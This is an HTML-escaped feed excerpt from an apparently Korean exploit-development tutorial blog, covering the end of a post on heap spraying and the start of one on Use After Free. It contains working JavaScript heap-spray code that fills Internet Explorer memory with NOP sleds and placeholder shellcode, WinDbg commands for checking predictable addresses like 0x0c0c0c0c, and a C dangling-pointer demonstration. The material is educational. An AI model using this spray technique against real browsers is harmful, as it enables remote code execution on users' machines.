		&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%u4148%u4B43'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		
		&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Alloc Done!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 코드를 실행한 뒤 이번에는 Windbg로 메모리 값을 살펴보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s -a 0x00000000 L?0x7fffffff &quot;HACK&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;먼저, 헤더부분을 보면 08 00 00 00에서 04 00 00 00으로 변환된 것을 확인할 수 있습니다.&lt;/p&gt;

&lt;p&gt;그리고 본문을 살펴보면 우리가 걱정했던 NUll이 모두 사라진 것을 확인할 수 있습니다.&lt;/p&gt;

&lt;p&gt;이제 Null 문제도 해결되었으니 본격적으로 Spray를 해보도록 하겠습니다.&lt;/p&gt;

&lt;h6 id=&quot;spray&quot;&gt;Spray&lt;/h6&gt;

&lt;p&gt;Heap Spray는 Heap 전체에 내가 원하는 코드를 골고루 위치시켜서 예측 가능한 공간에 Payload를 구성하기 위한 기법이라고 했었죠?&lt;/p&gt;

&lt;p&gt;Payload는 다수의 NOP과 Shell Code의 조합으로 한 덩어리를 구성할 겁니다.&lt;/p&gt;

&lt;p&gt;이 덩어리들을 반복적으로 여러개를 할당해서 힙 메모리 전역에 할당해준다면 어떻게 될까요?&lt;/p&gt;

&lt;p&gt;그럼 EIP를 제어할 때 쉘코드를 담고 있는 덩어리가 있는 곳으로 보낼 수 있겠죠.&lt;/p&gt;

&lt;p&gt;위치가 조금 다르다고 해도 NOP으로만 점프하도록 만들 수 있다면, Shell Code가 실행될 수 있을 겁니다.&lt;/p&gt;

&lt;p&gt;Spray 수행을 위해 다음과 같이 코드를 구성했습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;ShellCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%u4148%u4B43'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;chunksize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;num_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;chunksize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%u9090%u9090'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;chunksize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ShellCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;testArr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;testArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ShellCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Spray Done!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;한 덩어리의 크기가 0x1000인 덩어리(NOP+Shellcode) 200개를 메모리에 할당하도록 구성된 코드입니다.&lt;/p&gt;

&lt;p&gt;시작 위치를 살펴보기 쉽게 하기 위해서 ShellCode+NOP 형태로 구성하였습니다.&lt;/p&gt;

&lt;p&gt;코드를 실행한 후 Windbg로 살펴보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;“HACK” + NOP 200개가 출력되는 것이 보이네요.&lt;/p&gt;

&lt;p&gt;이번에는 다음 명령어로 전체 힙의 정보를 살펴보도록 할게요.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!heap -stat
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;출력되는 값들 중 맨 위 기본 힙의 사용량(Committed bytes)이 가장 많은 게 보이네요.&lt;/p&gt;

&lt;p&gt;그럼 우리가 입력한 값들이 힙에 얼마정도가 할당되어 뿌려졌는지 확인해보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!heap -stat -h 0x140000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_8.png&quot; alt=&quot;[그림 1-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;0x2010 크기로 c1 횟수만큼 무엇인가 할당이 되었고 70.11%를 차지하고 있다는 통계 내용을 확인할 수 있습니다.&lt;/p&gt;

&lt;p&gt;저 값이 내가 할당한 값이 맞는지 확인해봐야겠죠?&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!heap -flt s 0x2010
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 명령어는 heap에 0x2010 크기로 할당된 힙 chunk들을 찾아서 보여줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_9.png&quot; alt=&quot;[그림 1-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;찾아진 힙 chunk 중 하나의 주소값을 덤프해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_10.png&quot; alt=&quot;[그림 1-10]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;0x001cd370(Heap_Entry) 주소를 출력하니 힙 header(8 bytes) + BSTR 객체 header(4 bytes) + “HACK” + NOP이 보입니다.&lt;/p&gt;

&lt;p&gt;그런데 0x2010만큼 떨어진 곳의 값을 확인하니 전혀 다른 값들이 들어있는 것을 확인할 수 있죠?&lt;/p&gt;

&lt;p&gt;즉, 우리가 원하는 값이 연속적으로 할당된 것이 아니라 사이에 빈 공간이 존재한다는 것입니다.&lt;/p&gt;

&lt;p&gt;우리가 이제 해야할 것은 이 빈 공간을 줄여서 Exploit의 신뢰도를 높여야 합니다.&lt;/p&gt;

&lt;p&gt;이를 위해 코드를 다음과 같이 수정했습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;Shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%u4148%u4B43'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;chunksize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;num_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;chunksize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%u9090%u9090'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;chunksize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;testArr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;testArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Spray Done!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;chunk 크기를 0x40000으로 늘리고 chunk의 개수를 500개로 늘렸습니다.&lt;/p&gt;

&lt;p&gt;이를 실행한 후 다시 위 과정을 반복해보면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_12.png&quot; alt=&quot;[그림 1-12]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;0x80010 크기로 1f5개가 할당되었고 99.33%만큼 힙에 뿌려진 것을 알 수 있습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!heap -flt s 0x80010
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 명령어로 0x80010 크기만큼 할당된 영역을 다시 확인해보면 아래와 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_13.png&quot; alt=&quot;[그림 1-13]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이 중 아무 위치나 선택해서 덤프해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_14.png&quot; alt=&quot;[그림 1-14]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;0x80010만큼 할당되었다고 했기에 0x80000 위치쯤을 확인해보니 chunk 사이에 여전히 빈 공간이 남아있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;!heap -flt s 0x080010으로 출력되었던 주소 간의 거리를 구해서 다시 출력해보니 아래와 같이 잘 출력이 되는 것이 보이네요.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_15.png&quot; alt=&quot;[그림 1-15]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;역시나 빈 공간이 생긴다는 것은 어쩔 수 없는 것 같습니다.&lt;/p&gt;

&lt;p&gt;하지만!! 우리가 할당한 각 chunk의 크기가 워낙 크고 많기 때문에 이 정도 수치는 무시하셔도 좋습니다.&lt;/p&gt;

&lt;h6 id=&quot;예측-가능한-주소&quot;&gt;예측 가능한 주소&lt;/h6&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;d 0c0c0c0c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 명령어로 0c0c0c0c, 0a0a0a0a 등 예측 가능한 주소를 덤프해봅시다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_16.png&quot; alt=&quot;[그림 1-16]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위와 같이 NOP이 위치하는 것을 알 수 있습니다. 이는 한 번 출력되었다고 해서 사용할 수 있는 것은 아니며,&lt;/p&gt;

&lt;p&gt;반복적으로 덤프해본 후, 신뢰할만한 주소인지 확인해야 합니다.&lt;/p&gt;

&lt;p&gt;위 주소에 늘 NOP이 위치한다면 Exploit 때 신뢰할 수 있는 ShellCode의 주소로 사용할 수 있습니다.&lt;/p&gt;

&lt;p&gt;지금까지 기본적인 HeapSpray에 대해서 알아봤습니다.&lt;/p&gt;

&lt;p&gt;다음 글부터는 지금까지 설명한 취약점들을 종합해서 IE8, IE10, IE11 Exploit을 살펴보도록 하겠습니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x0d Heap Spray</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Use After Free</title>
      <link href="http://localhost:4000/windows-0x0c" rel="alternate" type="text/html" title="Use After Free" />
      <published>2019-05-06T20:18:00+09:00</published>
      <updated>2019-05-06T20:18:00+09:00</updated>
      <id>http://localhost:4000/windows-0x0c</id>
      <content type="html" xml:base="http://localhost:4000/windows-0x0c">&lt;h1 id=&quot;0x0c-use-after-free&quot;&gt;0x0c Use After Free&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;오늘은 Use After Free에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;what-is-use-after-free&quot;&gt;What is Use After Free?&lt;/h5&gt;

&lt;p&gt;Use After Free는 단어 그대로 Free된 Pointer를 사용했을 때 발생하는 취약점입니다.&lt;/p&gt;

&lt;p&gt;UAF를 설명할 때 주로 다음의 샘플 코드를 많이 이용하는데 UAF를 한 번에 잘 설명하고 있습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Object *obj = (Object *)malloc(sizeof(Object));
obj-&amp;gt;Method();
free(obj);		// Free
...
obj-&amp;gt;Method();	// Use
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 코드의 첫 코드를 보면 malloc으로 Object의 크기만큼 Heap을 할당해주고 있습니다.&lt;/p&gt;

&lt;p&gt;그리고 세 번째 줄에서 할당했던 객체를 해제해주고 있죠.&lt;/p&gt;

&lt;p&gt;마지막 코드를 보시면, 이미 해제된 Pointer가 다시 사용되고 있는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;이처럼, Free된 후 해당 메모리를 가리키던 Pointer가 다시 사용될 때를 UAF 버그라고 이야기합니다.&lt;/p&gt;

&lt;p&gt;그런데..이거 가지고 뭘 할 수가 있지??&lt;/p&gt;

&lt;p&gt;그렇죠.. 아직 이 코드만 가지고는 명확한 이해가 안 될 수 있습니다.&lt;/p&gt;

&lt;p&gt;다음 예제를 가지고 조금 더 쉽게 설명해보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;uaf-example&quot;&gt;UAF Example&lt;/h5&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

typedef struct uaf {

	void (*vulnfunc)();

}uaf;

void good() {
	printf(&quot;I'm Joel\n&quot;);
}

void bad() {
	printf(&quot;I'm not Joel\n&quot;);
}

int main(int argc, char* cargv[]) {

	uaf * first = malloc(sizeof(uaf));
	uaf * second;

	first-&amp;gt;vulnfunc = good;
	first-&amp;gt;vulnfunc();

	free(first);

	second = malloc(sizeof(uaf));
	second-&amp;gt;vulnfunc = bad;
	
	first-&amp;gt;vulnfunc();

	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 코드를 보면 먼저, first라는 객체에 uaf 크기만큼 Heap을 할당해주었습니다.&lt;/p&gt;

&lt;p&gt;그리고 vulnfunc에 good 함수의 주소를 넣어주었습니다.&lt;/p&gt;

&lt;p&gt;그럼 first-&amp;gt;vulnfunc();를 실행하게 되면 “I’m Joel”이라는 메시지가 출력되겠네요.&lt;/p&gt;

&lt;p&gt;여기까진 쉽죠??&lt;/p&gt;

&lt;p&gt;이후 first를 free 해줍니다.&lt;/p&gt;

&lt;p&gt;그리곤 second 객체를 생성하고 uaf 크기만큼 Heap을 할당해주었습니다.&lt;/p&gt;

&lt;p&gt;uaf 크기만큼 할당하고 해제한 뒤, 다시 uaf 크기만큼 할당하면 second는 first가 할당받았던 Heap과 동일한 영역을 할당받게 됩니다.&lt;/p&gt;

&lt;p&gt;지난 번 Heap 구조를 설명했던 것.. 기억하시나요?&lt;/p&gt;

&lt;p&gt;할당된 Heap을 해제하게 되면 Kernel로 바로 보내버리는 게 아니라, List에 넣어둔다고 했었죠?&lt;/p&gt;

&lt;p&gt;그런 다음 다시 동일한 크기의 Heap을 할당해달라고 요청하면 방금 해제된 영역을 재할당해줍니다.&lt;/p&gt;

&lt;p&gt;그럼 first가 해제된 다음 second를 요청하니까 second에는 first에 할당되었던 것과 동일한 영역이 할당되겠죠?&lt;/p&gt;

&lt;p&gt;지금까지 설명한 내용을 표현하자면 다음과 같이 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0c_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;다시 코드로 돌아가서, second의 vulnfunc에 bad 함수의 주소를 넣어주고 있습니다.&lt;/p&gt;

&lt;p&gt;마지막으로, 이미 해제된 Pointer를 요청합니다.&lt;/p&gt;

&lt;p&gt;first-&amp;gt;vulnfunc()를 호출하면 어떤 일이 생기게 될까요?&lt;/p&gt;

&lt;p&gt;second에 bad의 함수를 넣어뒀기 때문에 I’m not Joel이 호출되겠죠?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0c_2.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;실제 실행을 해보니 동일하게 구동이 되네요.&lt;/p&gt;

&lt;p&gt;지금까지 설명한 것을 중요 부분만 한 번 더 따라가 볼게요.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;uaf * first = malloc(sizeof(uaf));
first-&amp;gt;vulnfunc = good;
first-&amp;gt;vulnfunc();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;first 객체를 생성하고 uaf만큼 Heap을 할당해줍니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;free(first);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;그런 다음 free로 해제해줍니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;first-&amp;gt;vulnfunc();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;그리고 개발자의 부주의로 인해 이미 할당 해제된 Pointer가 재사용되고 있습니다.&lt;/p&gt;

&lt;p&gt;뭔가 감이 오시나요?&lt;/p&gt;

